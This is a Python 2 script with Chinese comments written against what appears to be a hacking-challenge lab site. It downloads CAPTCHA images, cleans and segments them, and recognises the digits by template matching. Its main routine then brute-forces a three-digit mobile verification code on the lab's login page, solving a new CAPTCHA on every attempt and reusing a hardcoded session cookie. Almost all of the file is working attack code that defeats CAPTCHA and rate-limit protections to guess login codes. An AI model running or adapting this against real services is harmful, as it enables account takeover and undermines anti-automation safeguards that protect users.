# -*- coding:utf-8 -*-

from PIL import Image
import os
import re 
import requests
import sys
import pytesseract
import math
import matplotlib.pyplot as plt

#存放切割的单个字符
CROP_IMAGES = []
#存放验证码图片
IMAGE_PATH = ".\\images\\"
#存放数字集
NUM_PATH = ".\\numbers\\"
#存放测试用图
TEST_PATH = ".\\test\\"
BASE_URL = "http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/"
#先点击登陆页面的获取验证码按钮，得到相应的cookie值
HEADERS = {'Cookie': "PHPSESSID=fb6b585a36b8d4d438f23e01bcbb7df9"}


#获取验证码用于素材
def download(img_num):
    vcode_url = BASE_URL + 'vcode.php'
    for i in range(img_num):
        #获取图片内容
        res = requests.get(vcode_url, stream=True)
        #写入图片
        with open(IMAGE_PATH + str(i) + '.png', 'wb') as f:
            for chunk in res.iter_content(chunk_size=1024):
                f.write(chunk)
                f.flush()
    print "Finish!"
    
    
#图像预处理
def clear_image(img):
    #灰度化
    img = img.convert('L')
    #二值化
    threshold = 140
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    out = img.point(table, '1')
    return out


#统计某一列像素值为0的个数
def column_pixel(img, x):
    counter = 0
    for y in range(img.size[1]):
        pix = img.getpixel((x, y))
        if pix == 0:
            counter += 1
    return counter
    

#统计某一行像素值为0的个数
def row_pixel(img, y):
    counter = 0
    for x in range(img.size[0]):
        pix = img.getpixel((x,y))
        if pix == 0:
            counter += 1
    return counter    


#将图片转换为矢量
def build_vector(img):
    vector = {}
    count = 0
    for i in img.getdata():
        vector[count] = i
        count += 1
    return vector 
  
    
#实现向量空间      
class VectorCompare:
    #计算矢量大小
    def magnitude(self,concordance):
        total = 0
        for word,count in concordance.iteritems():
            total += count ** 2
        return math.sqrt(total)

    #计算矢量之间的 cos 值
    def relation(self,concordance1, concordance2):
        relevance = 0
        topvalue = 0
        for word, count in concordance1.iteritems():
            if concordance2.has_key(word):
                topvalue += count * concordance2[word]
        return topvalue / (self.magnitude(concordance1) * self.magnitude(concordance2))                                   


#分割单个字符,先纵向再横向
def crop_image(img, start=0):
    for x in range(start, img.size[0]):
        if column_pixel(img, x) > 0:
            #数字除了1以外，宽度为8pix。而1的宽度为6pix
            #若该数字为1，则第三列跟第四列的像素总值为10
            if column_pixel(img, x+3) == 10:
                child_img = img.crop((x, 0, x+6, 20))
                #CROP_IMAGES.append(child_img)
                for y in range(0, child_img.size[1]):
                    if row_pixel(child_img, y) > 0:
                        last_img = child_img.crop((0, y, 6, y+10))
                        CROP_IMAGES.append(last_img)
                        break
                crop_image(img, x+6)
                break
            else:
                child_img = img.crop((x, 0, x+8, 20))
                #CROP_IMAGES.append(child_img)
                for y in range(0, child_img.size[1]):
                    if row_pixel(child_img, y) > 0:
                        last_img = child_img.crop((0, y, 8, y+10))
                        CROP_IMAGES.append(last_img)
                        break
                crop_image(img, x+8)
                break
    
            
#识别验证码    
def verify(img):
    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    result = []
    
    img = clear_image(img)
    crop_image(img)
    #分割的数字逐个识别
    for im in CROP_IMAGES[-4:]:
        split_data = im.getdata()   
        for num in numbers:
            num_img = Image.open(NUM_PATH + num + '.png')
            num_img = clear_image(num_img)
            num_data = num_img.getdata()
            switch = 0
            for i in range(len(num_data)):
                if split_data[i] != num_data[i]:
                    switch = 1
                    break
            if switch == 0:
                result.append(num)
                break
    return ''.join(result)


#获取验证码用于爆破
def get_captcha():
    vcode_url = BASE_URL + 'vcode.php'
    res = requests.get(vcode_url, headers = HEADERS)
    with open(IMAGE_PATH + 'temp.png', 'wb') as f:
        f.write(res.content)
    img = Image.open(IMAGE_PATH + 'temp.png')
    result = verify(img)
    return result
    
#爆破主程序
def crack():
    for pwd in range(100, 1000):
        captcha = get_captcha()
        login_url = BASE_URL + 'login.php'
        payload = {'username':13388886666, 'mobi_code':pwd, 'user_code':captcha}
        res = requests.post(login_url, data=payload, headers=HEADERS)
        response = res.content.decode('utf-8')
        if 'error' not in response:
            print "The correct mobile code is %d" % pwd
            print response
            break
        else:
            print "Captcha: %s   mobile code: %d" % (captcha,pwd)
                    
        
if __name__ == '__main__':
    """  
    #下载图片素材
    download(20)
    
    #使用OCR技术识别整个验证码
    for test in range(20):
        img = Image.open(IMAGE_PATH + str(test) + '.png')
        vcode = pytesseract.image_to_string(img)
        try:
            os.rename(IMAGE_PATH + str(test) + '.png', IMAGE_PATH + vcode + '.png')
        except WindowsError as e:
            print e
    print "Complete!"
    
    #切割字符作为单个字符的识别库
    img = Image.open(IMAGE_PATH + '4803.png')  
    crop_image(img)
    for i in range(4):
        CROP_IMAGES[i].save(TEST_PATH + str(i) + '.png') 
        
    #空间向量模型测试
    im1 = Image.open(TEST_PATH + '0-1.png')
    im2 = Image.open(TEST_PATH + '0-2.png')
    im3 = Image.open(TEST_PATH + '8.png')
    v1 = build_vector(im1)
    v2 = build_vector(im2)
    v3 = build_vector(im3)
    vc = VectorCompare()
    print u"图片0-1与图片0-2的相似度:", vc.relation(v1, v2)
    print u"图片0-1与图片8的相似度:", vc.relation(v1, v3)
    print u"图片0-2与图片8的相似度:", vc.relation(v2, v3)
    
    #验证码识别
    for file_name in os.listdir(IMAGE_PATH):
        img = Image.open(IMAGE_PATH + file_name)
        plt.imshow(img)
        plt.axis('off')
        plt.show()
        vcode = verify(img)
        print "识别结果：%s" % vcode
    """ 
    #爆破
    crack()
                     
